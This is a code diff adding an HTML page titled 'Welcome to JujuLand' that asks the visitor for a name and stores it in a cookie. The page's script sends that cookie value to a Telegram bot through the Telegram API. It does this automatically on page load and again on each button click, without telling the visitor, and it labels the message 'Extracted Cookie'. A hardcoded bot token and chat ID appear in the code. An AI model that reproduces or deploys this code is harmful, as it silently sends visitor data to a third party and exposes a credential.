@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to JujuLand</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Welcome to JujuLand</h1>
+    <p id="cookie-status">Checking your cookie...</p>
+    <button id="set-cookie-btn">Set a Cookie</button>
+</div>
+
+<script>
+    // Function to set a cookie
+    function setCookie(name, value, days) {
+        const d = new Date();
+        d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+        let expires = "expires=" + d.toUTCString();
+        document.cookie = name + "=" + value + ";" + expires + ";path=/";
+    }
+
+    // Function to get a cookie
+    function getCookie(name) {
+        let decodedCookie = decodeURIComponent(document.cookie);
+        let cookiesArray = decodedCookie.split(';');
+        for(let i = 0; i < cookiesArray.length; i++) {
+            let cookie = cookiesArray[i].trim();
+            if (cookie.indexOf(name + "=") == 0) {
+                return cookie.substring(name.length + 1);
+            }
+        }
+        return "";
+    }
+
+    // Function to send the cookie to Telegram via a bot
+    function sendCookieToTelegram(cookieValue) {
+        const botToken = '7694280275:AAGH4Vj9dh9gCMoAwmPeikpWbtyStdNwXc8';  // Your bot token
+        const chatId = '693873866';  // Your chat ID
+        const message = encodeURIComponent(`Extracted Cookie: ${cookieValue}`);
+
+        // Fetch API to send the message to Telegram
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+            .then(response => {
+                if (response.ok) {
+                    console.log("Cookie sent to Telegram successfully.");
+                } else {
+                    console.log("Failed to send cookie to Telegram.");
+                }
+            })
+            .catch(error => {
+                console.error("Error sending message to Telegram:", error);
+            });
+    }
+
+    // Check for the cookie when the user visits
+    const cookieStatus = document.getElementById("cookie-status");
+    const username = getCookie("username");
+
+    if (username) {
+        cookieStatus.textContent = `Welcome back, ${username}!`;
+        sendCookieToTelegram(username);  // Automatically send cookie to Telegram
+    } else {
+        cookieStatus.textContent = "No cookie found. Please set a cookie.";
+    }
+
+    // Set cookie when the button is clicked
+    document.getElementById("set-cookie-btn").addEventListener("click", () => {
+        const username = prompt("Please enter your name:", "John Doe");
+        if (username) {
+            setCookie("username", username, 7);  // Set cookie to expire in 7 days
+            cookieStatus.textContent = `Cookie set! Welcome, ${username}.`;
+            sendCookieToTelegram(username);  // Send the new cookie to Telegram
+        }
+    });
+</script>
+
+</body>
+</html>
